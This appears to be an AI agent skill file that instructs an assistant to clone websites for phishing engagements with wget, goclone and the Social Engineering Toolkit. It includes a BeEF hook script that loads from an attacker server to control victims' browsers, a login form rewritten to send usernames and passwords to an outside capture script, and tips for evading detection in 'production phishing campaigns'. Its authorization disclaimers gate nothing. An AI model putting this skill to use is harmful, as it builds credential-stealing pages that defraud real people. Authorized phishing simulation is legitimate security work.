---
name: website-clone-phishing
description: Clone websites for phishing assessments and social engineering engagements. Use this skill whenever the user needs to create a copy of a target website for phishing campaigns, security assessments, or social engineering testing. Trigger on mentions of: cloning websites, dumping sites, phishing infrastructure, creating fake login pages, website mirroring for assessments, or any request to replicate a website for security testing purposes.
---

# Website Cloning for Phishing Assessments

This skill helps you clone websites for authorized phishing assessments and social engineering engagements. Cloning a target website allows you to create realistic phishing pages that match the original site's appearance.

## Prerequisites

- Ensure you have **authorization** for the target website before cloning
- This should only be used in authorized security assessments, penetration testing engagements, or training environments
- Never clone websites without explicit permission

## Method 1: wget (Recommended - Most Reliable)

The `wget` tool is the most widely available and reliable method for cloning websites. It recursively downloads the entire site including HTML, CSS, JavaScript, and images.

### Basic Command

```bash
wget --mirror --page-requisites --convert-links --adjust-extension <URL>
```

### What each flag does:

- `--mirror`: Enables recursive downloading with infinite depth and time-stamping
- `--page-requisites`: Downloads all resources needed to display the page (CSS, JS, images)
- `--convert-links`: Converts links for local viewing (changes absolute URLs to relative)
- `--adjust-extension`: Adds `.html` extension to files without extensions

### Serve the cloned site locally

After cloning, serve the site to test it:

```bash
cd <cloned-directory>
python3 -m http.server 8000
```

Then access at `http://localhost:8000`

### Using the bundled script

For convenience, use the bundled script:

```bash
./scripts/clone-website.sh <URL>
```

This script handles the cloning and provides instructions for serving the result.

## Method 2: goclone (Alternative)

[goclone](https://github.com/imthaghost/goclone) is a Go-based website cloner that can be faster for some sites.

```bash
goclone <url>
```

**Installation:**
```bash
go install github.com/imthaghost/goclone@latest
```

## Method 3: Social Engineering Toolkit (SET)

[SET](https://github.com/trustedsec/social-engineer-toolkit) is a comprehensive social engineering framework that includes website cloning capabilities.

```bash
# Clone and run SET
git clone https://github.com/trustedsec/social-engineer-toolkit
cd social-engineer-toolkit
sudo python3 setup.py
sudo setoolkit
```

Then navigate to the website cloning module within the SET interface.

## Adding Payloads to Cloned Sites

Once you have a cloned website, you can add payloads for assessment purposes:

### BeEF Hook

Add a BeEF hook to the cloned HTML to "control" the victim's browser tab:

```html
<!-- Add to <head> section of cloned pages -->
<script type="text/javascript" src="http://<beef-server-ip>:3000/hook.js"></script>
```

### Credential Capture Form

Modify the login form to capture credentials:

```html
<!-- Original form -->
<form action="/login" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
</form>

<!-- Modified to capture -->
<form action="http://<your-server>/capture.php" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
</form>
```

## Best Practices

1. **Test locally first**: Always test the cloned site locally before deploying
2. **Check for broken links**: Use `--convert-links` to ensure internal links work
3. **Verify assets load**: Check that CSS, JS, and images are properly downloaded
4. **Update timestamps**: Consider modifying HTML timestamps to avoid detection
5. **Use HTTPS**: For production phishing campaigns, use HTTPS with a valid certificate
6. **Keep it minimal**: Only clone what you need to reduce detection risk

## Troubleshooting

### Missing resources

If some CSS or images don't load:

```bash
# Try with more aggressive options
wget --mirror --page-requisites --convert-links --adjust-extension \
  --execute robots=off --no-check-certificate <URL>
```

### JavaScript-heavy sites

For sites that rely heavily on JavaScript, consider:
- Using browser automation tools (Selenium, Puppeteer)
- Manually inspecting and fixing the cloned pages
- Using goclone which may handle some JS better

### Large sites

For very large sites, limit the scope:

```bash
# Only clone specific paths
wget --mirror --page-requisites --convert-links --adjust-extension \
  --accept-regex "/login|/auth|/portal" <URL>
```

## Legal and Ethical Considerations

- **Authorization is required**: Only clone websites you have explicit permission to test
- **Document your authorization**: Keep written proof of authorization
- **Scope your testing**: Only clone pages within your authorized scope
- **Respect privacy**: Don't clone sites containing sensitive user data
- **Follow your engagement rules**: Adhere to the rules of engagement for your assessment
